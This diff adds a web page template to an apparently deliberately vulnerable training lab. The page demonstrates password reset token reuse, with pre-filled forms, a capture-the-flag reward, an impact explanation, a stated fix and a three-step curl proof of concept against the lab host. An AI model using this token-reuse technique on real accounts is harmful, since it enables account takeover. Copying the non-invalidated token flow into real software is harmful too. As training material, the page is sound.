@@ -1,0 +1,88 @@
+<%- include('../partials/navbar') %>
+<main class="main-content">
+  <div class="top-header"><span class="header-title">Password Reset</span>
+    <div class="header-right"><a href="/profile/<%= user ? user.id : '' %>" class="header-user">
+      <% if(user){ %><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div><% } %>
+    </a></div>
+  </div>
+  <div class="page-body">
+    <div style="max-width:900px;display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start;">
+      <div>
+        <div class="card" style="border-color:var(--warning);">
+          <div class="card-header" style="background:#FFFBEB;"><h3>🔑 Password Reset Token Reuse</h3><span class="badge badge-warning">Not Invalidated</span></div>
+          <div class="card-body">
+            <% if(result && result.error){ %><div class="alert alert-danger"><%= result.error %></div><% } %>
+            <% if(result && result.success){ %>
+            <div class="alert alert-<%= result.flag?'warning':'success' %>">
+              <%= result.flag?'⚠️':'✅' %> <%= result.message %> (used <%= result.use_count %> time<%= result.use_count!==1?'s':'' %>)
+              <% if(result.flag){ %><br><code style="color:var(--success);font-size:12px;">🚩 <%= result.flag %></code><% } %>
+            </div>
+            <% } %>
+
+            <% if(step === 'request'){ %>
+            <form action="/reset-token-reuse/request" method="POST">
+              <div class="form-group"><label>Email Address</label><input type="email" name="email" value="john.doe@syntex.local" required></div>
+              <button type="submit" class="btn btn-primary" style="width:100%;">Request Reset Token</button>
+            </form>
+            <% } else if(step === 'verify' || step === 'done'){ %>
+            <% if(token && locals.lab && lab.showHints){ %>
+            <div style="background:var(--page-bg);border:1px solid var(--border);border-radius:var(--radius);padding:10px;margin-bottom:14px;">
+              <div style="font-size:11px;color:var(--text-muted);margin-bottom:4px;">Dev mode — token:</div>
+              <code style="font-size:13px;word-break:break-all;color:var(--accent);"><%= token %></code>
+            </div>
+            <% } %>
+            <form action="/reset-token-reuse/verify" method="POST">
+              <input type="hidden" name="email" value="john.doe@syntex.local">
+              <div class="form-group"><label>Reset Token</label><input type="text" name="token" value="<%= token||'' %>" required style="font-family:monospace;font-size:12px;"></div>
+              <div class="form-group"><label>New Password</label><input type="password" name="new_password" value="hacked123" required></div>
+              <div style="display:flex;gap:8px;">
+                <button type="submit" class="btn btn-primary" style="flex:1;">Reset Password (1st use)</button>
+              </div>
+            </form>
+            <% if(step === 'done'){ %>
+            <form action="/reset-token-reuse/verify" method="POST" style="margin-top:8px;">
+              <input type="hidden" name="email" value="john.doe@syntex.local">
+              <input type="hidden" name="token" value="<%= token||'' %>">
+              <input type="hidden" name="new_password" value="hacked456">
+              <button type="submit" class="btn btn-danger" style="width:100%;">↩️ Reuse Same Token (2nd use)</button>
+            </form>
+            <% } %>
+            <% } %>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="card mb-4">
+          <div class="card-header"><h3>Real-World Impact</h3></div>
+          <div class="card-body" style="font-size:12px;color:var(--text-muted);line-height:1.8;">
+            <p>If a reset token is not invalidated after first use:</p>
+            <ol style="padding-left:18px;margin-top:8px;">
+              <li>Attacker intercepts reset email (phishing, MitM, email compromise)</li>
+              <li>Victim uses token to reset password — attacker notes the token</li>
+              <li>Attacker reuses the same token to reset password again</li>
+              <li>Victim is locked out of their own account</li>
+            </ol>
+            <p style="margin-top:8px;"><strong>Fix:</strong> Delete the token from the database immediately after successful use.</p>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h3>curl PoC</h3></div>
+          <div class="card-body">
+            <pre style="font-size:11px;"># Step 1: Request token
+curl -X POST http://syntex.local/reset-token-reuse/request \
+  -d "email=john.doe@syntex.local"
+
+# Step 2: Use token (1st time)
+curl -X POST http://syntex.local/reset-token-reuse/verify \
+  -d "email=john.doe@syntex.local&token=TOKEN&new_password=pw1"
+
+# Step 3: Reuse same token (2nd time — gets flag)
+curl -X POST http://syntex.local/reset-token-reuse/verify \
+  -d "email=john.doe@syntex.local&token=TOKEN&new_password=pw2"</pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+</div><%- include('../partials/footer') %>
